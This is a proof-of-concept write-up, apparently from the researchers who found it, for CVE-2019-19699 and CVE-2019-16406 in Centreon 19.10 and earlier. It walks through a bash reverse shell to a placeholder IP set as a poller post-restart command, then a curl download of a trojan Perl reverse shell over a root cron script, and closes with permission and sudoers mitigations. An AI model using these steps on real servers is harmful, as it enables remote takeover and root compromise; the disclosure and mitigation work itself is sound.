

# CVE-2019-19699  

### Centreon =\< 19.10
**Proof of Concept**

1. Authenticated Remote Code Execution (CVE-2019-19699)
2. Privilege escalation (Walkthrough & Mitigation)

**Discovered by:**

_SpengeSec (Guylian Dw)_

_TheCyberGeek (Matthew B)_


**Authenticated Remote Code Execution:**

Lets start by logging in as user Admin to the Centreon web panel.
<p align="center">
  <img src="img/login.png"
</p>

After logging in we navigate to **Configuration > Commands > Miscellaneous**

Proceed by clicking **Add** as shown in the image below.
<p align="center">
  <img src="img/add.png"
</p>


We now create a **bash reverse shell** as our Miscellaneous command
```
#!/bin/bash
bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
```

<p align="center">
  <img src="img/command.png"
</p>
  
And click **Save**

Now we navigate to **Configuration > Pollers** and proceed by clicking on our current _Central_ poller
<p align="center">
  <img src="img/poller.png"
</p>

This gives u access to the **Modify a poller Configuration** menu

Here we can scroll down, and set a **Post-restart command**
<p align="center">
  <img src="img/poller_config.png"
</p>
  
Proceed by selecting the **reverse shell** we previously created, and click the **Save** button

We can now proceed by starting the **Netcat** listener on our local machine
<p align="center">
  <img src="img/listener.png"
</p>

Finally we click the **Export configuration** button in the **Configuration > Pollers** menu
<p align="center">
  <img src="img/export.png"
</p>

1. Select our **Central** poller in the **Pollers** drop down box

2. Untick the **Generate Configuration Files** and **Run monitoring engine debug (-v)** check boxes

3. Tick the **Restart Monitoring Engine** and **Post generation command** check boxes

4. Select **Restart** in the **Method** dropdown box
<p align="center">
  <img src="img/final.png"
</p>

Upon clicking **Export** the Poller will restart, and thus execute the **Post-Restart Command** we previously configured
This is the moment our reverse shell listener will get a connection
<p align="center">
  <img src="img/listener.gif"
</p>
  
**Authenticated Remote Code Execution has been successful!**

_(This was the write up for **CVE-2019-19699**)_

From here on we move to gaining **Root** 

We will use **CVE-2019-16406** found by _TheCyberGeek_ to fully compromise the Centreon =< 19.10 server

Let's start by spawning a **TTY shell** in our current reverse shell terminal

```python -c 'import pty; pty.spawn("/bin/sh")'```
<p align="center">
  <img src="img/tty_shell.gif"
</p>
  
We now take a look which cron tasks exist by doing a **cat /etc/cron.d/***
<p align="center">
  <img src="img/cat_cron.gif"
</p>
  
We now see that **centreon_autodisc.pl** is a Cron task

(Was set from _30 22 * * * root_ **to**  _* * * * * root_ for **demonstration purposes**)
<p align="center">
  <img src="img/cron_disco.png"
</p>
  
This is executed as **Root**, lets _replace_ the **centreon_autodisco.pl** with a **Perl reverse shell**

The **Perl shell** i will be using, can be downloaded [here](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)

Download the reverse shell, and edit the **ip address** and **port** to yours as explained on the web page

Preform a mv to rename the **perl-reverse-shell.pl** to **centreon_autodisco.pl** file locally
<p align="center">
  <img src="img/mv_shell.png"
</p>
  
Lets go ahead and start a local **_SimpleHTTPServer_** on a port of your choice
  <p align="center">
<img src="img/http_server.png"
</p>
    
This way, we can **_curl http://{local_ip}:{port}/centreon_autodisco.pl -o /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/centreon_autodisco.pl_** to replace the existing **centreon_autodisco.pl** with our _trojan_ Perl reverse shell
<p align="center">
  <img src="img/curl_rootshell.png"
</p>
  
Now the file file has been replaced, all there is left to do is start a **Netcat listener** on the port we have previously configured, and we will get a connection back from the server as user **Root**!
<p align="center">
  <img src="img/root.gif"
</p>
  
**Root system access has been successful!**

Now on to the notes on how we think the **privilege escalation** should be **mitigated**!

**Current settings in 19.10:**

```Cron:
#####################################
# Centreon Auto Discovery
#

30 22 * * * root ls -la --config='/etc/centreon/conf.pm' --config-extra='/etc/centreon/centreon_autodisco.pm' --severity=error >> /var/log/centreon/centreon_auto_discovery.log 2>&1
* * * * * centreon /opt/rh/rh-php72/root/usr/bin/php /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/hostDiscovery/HostDiscovery.php >> /var/log/centreon/centreon_host_discovery.log 2>&1

File Permissions:
-rwxr-xr-x 1 apache apache 173 Oct 11 11:09 /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/centreon_autodisco.pl
-rw-r--r-- 1 apache apache 7880 Oct 11 11:09 /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/hostDiscovery/HostDiscovery.php
-rwsrwxr-x 1 root root 7240 Aug 11  2017 /usr/lib/centreon/plugins/cwrapper_perl
```




**Mitigation for 
/usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/hostDiscovery/HostDiscovery.php**

```chown root:apache /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/hostDiscovery/HostDiscovery.php```

```chmod 755 /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/hostDiscovery/HostDiscovery.php```

```ls -la who```

-rwxr-xr-x 1 root apache 7880 Oct 11 11:09 /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/hostDiscovery/HostDiscovery.php

As you can see it is now owned by **Root**, group **apache** can **read and execute** it only, **centreon** can **execute** it only there for it does **not affect functionality**.



**Example:**

```bash-4.2$ whoami```

apache

```bash-4.2$ echo "hello" > /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/hostDiscovery/HostDiscovery.php```

bash: /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/hostDiscovery/HostDiscovery.php: **Permission denied**
But **apache** can still **execute** it.


**Mitigation for /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/centreon_autodisco.pl**

```chown root:apache /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/centreon_autodisco.pl```

```chmod 755 /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/centreon_autodisco.pl```

```ls -la /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/centreon_autodisco.pl```

-rwxr-xr-x 1 root apache 173 Oct 11 11:09 /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/centreon_autodisco.pl

As you can see it is now owned by **Root**, group **apache** can **read and execute** it only, **centreon** can **execute** it only there for it does **not affect functionality**.



**Example:**

```bash-4.2$ whoami```

apache

```bash-4.2$ echo "hello" > /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/centreon_autodisco.pl```

bash: /usr/share/centreon/www/modules/centreon-autodiscovery-server//cron/centreon_autodisco.pl: **Permission denied**
But **apache** can still **execute** it.


**Mitigation for /usr/lib/centreon/plugins/cwrapper_perl**

Use sudo commands defining specific scripts needing to be executed by each user. 

Making **root** own each **perl script** so **users cannot alter or replace** the script for privilege escalation.

```chmod 755 /usr/lib/centreon/plugins/cwrapper_perl```

```ls -la /usr/lib/centreon/plugins/cwrapper_perl```

-rwxr-xr-x 1 root root 7240 Aug 11  2017 /usr/lib/centreon/plugins/cwrapper_perl

Now users can no longer alter or replace the script!



**Example:**

```cat /etc/sudoers```

...

\## Allow root to run any commands anywhere

root ALL=(ALL) ALL

centreon ALL=(ALL:ALL) NOPASSWD: /usr/lib/centreon/plugins/cwrapper_perl example_script1.pl

centreon ALL=(ALL:ALL) NOPASSWD: /usr/lib/centreon/plugins/cwrapper_perl example_script2.pl

centreon ALL=(ALL:ALL) NOPASSWD: /usr/lib/centreon/plugins/cwrapper_perl example_script3.pl

centreon ALL=(ALL:ALL) NOPASSWD: /usr/lib/centreon/plugins/cwrapper_perl example_script4.pl

apache ALL(ALL:ALL) NOPASSWD: /usr/lib/centreon/plugins/cwrapper_perl example_scripts1.pl

apache ALL(ALL:ALL) NOPASSWD: /usr/lib/centreon/plugins/cwrapper_perl example_scripts2.pl

apache ALL(ALL:ALL) NOPASSWD: /usr/lib/centreon/plugins/cwrapper_perl example_scripts3.pl

apache ALL(ALL:ALL) NOPASSWD: /usr/lib/centreon/plugins/cwrapper_perl example_scripts4.pl

...

---End of Sudoers---

```ls -la example_script1.pl```

-rwxr-xr-x 1 root centreon 173 Dec 15 11:09 example_script1.pl

```ls -la examle_scripts1.pl```

-rwxr-xr-x 1 root apache 173 Dec 15 11:09 example_script1.pl




Users can still **execute** the needed scripts and the **scripts cannot be changed by apache or centreon** thus eliminating the security threat all together for priviledge escalation. 

If an attacker was to get into the machine now, taking full control of the machine would be very difficult or impossible unless more threats are discovered.

For the **Centreon user**, the only privilege escalation we could find was the **cwrapper for perl**, so if post-restart was executed by centreon user and an attacker gained a shell as centreon user, it would leave virtually no more attack surface.

**Thanks for reading**
